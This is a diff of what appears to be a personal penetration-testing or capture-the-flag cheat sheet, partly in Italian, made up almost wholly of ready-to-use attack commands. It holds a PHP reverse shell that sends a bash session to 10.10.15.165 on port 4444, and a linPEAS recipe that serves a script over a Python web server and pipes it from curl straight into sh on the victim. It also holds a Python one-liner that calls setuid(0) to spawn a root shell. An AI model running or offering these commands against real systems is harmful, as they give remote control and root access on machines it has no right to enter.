@@ -21,3 +21,14 @@ TARGET (php):
 <?php
 system("bash -c 'bash -i >& /dev/tcp/10.10.15.165/4444 0>&1'");
 ?>
+
+
+-- linPeas (PrivEscalation)
+
+# Local network
+sudo python3 -m http.server 80 #Host
+curl 10.10.10.10/linpeas.sh | sh #Victim
+
+-- Python con privilegi (PrivEscalation)
+
+python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
